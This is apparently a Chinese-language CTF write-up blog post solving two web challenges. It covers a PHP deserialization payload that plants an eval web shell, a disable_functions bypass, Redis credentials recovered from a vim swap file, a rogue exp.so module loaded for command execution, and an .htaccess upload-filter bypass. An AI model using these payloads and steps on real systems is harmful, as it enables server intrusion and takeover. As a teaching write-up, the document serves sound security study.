---
title: redisRCE&&disable_function绕过
date: '2024-06-12 19:49'
categories: CTF
tags: RCE
cover: 'https://gitee.com/eviden/img/raw/master/33591dfae30e46459108dc785e1217a9.png'
description: RedisRCE
abbrlink: 6d4a3223
---

> [天翼杯 2021esay_eval | NSSCTF](https://www.nssctf.cn/problem/364)

```php
#开题源码
<?php
class A{
    public $code = "";
    function __call($method,$args){
        eval($this->code);
        
    }
    function __wakeup(){
        $this->code = "";
    }
}

class B{
    function __destruct(){
        echo $this->a->a();
    }
}
if(isset($_REQUEST['poc'])){
    preg_match_all('/"[BA]":(.*?):/s',$_REQUEST['poc'],$ret);
    if (isset($ret[1])) {
        foreach ($ret[1] as $i) {
            if(intval($i)!==1){
                exit("you want to bypass wakeup ? no !");
            }
        }
        unserialize($_REQUEST['poc']);    
    }


}else{
    highlight_file(__FILE__);
}
```

`so easy` 的一个反序列化,要注意一个点,利用`php对类名大小写不敏感`的特性去绕过题目中的正则表达式，在构造payload的时候，将类名换为`a`,`b`；

```php
<?php
class a{

    public $code = "";
    function __construct(){
//$this->code="phpinfo();";
    $this->code="eval(\$_GET['pass']);";//写个🐎进去
}

}
class b{
    function __construct(){
        $this->a=new a();
    }
}
echo serialize(new b());
# 最后改一下b类属性的数量,让其不为1,触发wakeup魔术方法
//O:1:"b":2:{s:1:"a";O:1:"a":1:{s:4:"code";s:10:"phpinfo();";}}

O:1:"b":2:{s:1:"a";O:1:"a":1:{s:4:"code";s:21:"eval($_POST['pass']);";}}
```

然后就是一键连接了.得到如下东西

![image-20240612201646430](https://gitee.com/eviden/img/raw/master/image-20240612201646430.png)

![image-20240612201703826](https://gitee.com/eviden/img/raw/master/image-20240612201703826.png)

刚准备查看上一级目录,提示权限不够呗

法一:直接暴力绕过disable_function,Antsword要利用插件,哥斯拉好像自带这个插件

![image-20240612202925716](https://gitee.com/eviden/img/raw/master/image-20240612202925716.png)

直接一把梭

![image-20240612203043549](https://gitee.com/eviden/img/raw/master/image-20240612203043549.png)

2.不用外挂,自己慢慢搞,然后看一下之前那个目录的文件,发现swp备份文件里面写着redis数据库的账号密码.拿去复原一下

这里是`vim缓存泄露`：

> 在开发人员使用 vim 编辑器 编辑文本时，系统会自动生成一个备份文件，当编辑完成后，保存时，原文件会更新，备份文件会被自动删除。
>
> 但是，当编辑操作意外终止时，这个备份文件就会保留，如果多次编辑文件都意外退出，备份文件并不会覆盖，而是以 swp、swo、swn 等其他格式，依次备份。

利用命令`vim -r xxxx.php.swp`恢复原配置文件

![image-20240612203444240](https://gitee.com/eviden/img/raw/master/image-20240612203444240.png)

得到如下:

```php
<?php

define("DB_HOST","localhost");
define("DB_USERNAME","root");
define("DB_PASSWOrd","");
define("DB_DATABASE","test");

define("REDIS_PASS","you_cannot_guess_it");
```

这里要下载`exp.so`文件，并进行利用，简单解释一下`exp.so`文件

> Redis 中的 `exp.so` 文件通常被用作 Redis 提权的一种方式。这个文件是一个 Redis 模块，它可以在 Redis 服务器中执行任意代码。
>
> Redis 模块是一种可插拔的扩展，它允许用户在 Redis 服务器中添加新的功能。`exp.so` 文件是一个 Redis 模块，它提供了一些命令和功能，可以让攻击者在 Redis 服务器中执行任意代码，从而获得服务器的控制权。
>
> 在 Redis 提权攻击中，攻击者通常会利用 Redis 的漏洞或者弱密码，获取 Redis 服务器的访问权限。一旦攻击者获得了访问权限，他们就可以上传 `exp.so` 文件到 Redis 服务器中，并使用 Redis 的 `module load` 命令加载这个文件。这个文件会在 Redis 服务器中执行任意代码，从而让攻击者获得服务器的控制权。

exp.so文件地址下载：https://github.com/Dliv3/redis-rogue-server

上传exp.so进行redis提权

然后利用蚁剑redis插件进行提权

![image-20240612204150887](https://gitee.com/eviden/img/raw/master/image-20240612204150887.png)

前面介绍过，我们要利用`module load` 命令加载这个文件，然后才能进行RCE，所以在虚拟命令行输入`MODULE LOAD /var/www/html/exp.so`

然后我们就可以进行命令执行了

```bash
system.exec "ls /"
system.exec "cat /flagaasdbjanssctf"
```

![image-20240612204403106](https://gitee.com/eviden/img/raw/master/image-20240612204403106.png)

> [BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#[GXYCTF2019]BabySQli)

这个题文件考的是上传漏洞,但是你深挖一下发现它里面还有些东西的,连上后门无法执行命令.

题目后端源码:

```php
<?php
session_start();
echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> 
<title>Upload</title>
<form action=\"\" method=\"post\" enctype=\"multipart/form-data\">
上传文件<input type=\"file\" name=\"uploaded\" />
<input type=\"submit\" name=\"submit\" value=\"上传\" />
</form>";
error_reporting(0);
if(!isset($_SESSION['user'])){
    $_SESSION['user'] = md5((string)time() . (string)rand(100, 1000));
}
if(isset($_FILES['uploaded'])) {
    $target_path  = getcwd() . "/upload/" . md5($_SESSION['user']);
    $t_path = $target_path . "/" . basename($_FILES['uploaded']['name']);
    $uploaded_name = $_FILES['uploaded']['name'];
    $uploaded_ext  = substr($uploaded_name, strrpos($uploaded_name,'.') + 1);
    $uploaded_size = $_FILES['uploaded']['size'];
    $uploaded_tmp  = $_FILES['uploaded']['tmp_name'];
 
    if(preg_match("/ph/i", strtolower($uploaded_ext))){
        die("后缀名不能有ph！");
    }
    else{
        if ((($_FILES["uploaded"]["type"] == "
            ") || ($_FILES["uploaded"]["type"] == "image/jpeg") || ($_FILES["uploaded"]["type"] == "image/pjpeg")) && ($_FILES["uploaded"]["size"] < 2048)){
            $content = file_get_contents($uploaded_tmp);
            if(preg_match("/\<\?/i", $content)){
                die("诶，别蒙我啊，这标志明显还是php啊");
            }
            else{
                mkdir(iconv("UTF-8", "GBK", $target_path), 0777, true);
                move_uploaded_file($uploaded_tmp, $t_path);
                echo "{$t_path} succesfully uploaded!";
            }
        }
        else{
            die("上传类型也太露骨了吧！");
        }
    }
}
?>
```

上传`.htaccess`以及jpg文件绕过所有的waf.

然后利用哥斯拉bypass disable_function

![image-20240613000011010](https://gitee.com/eviden/img/raw/master/image-20240613000011010.png)

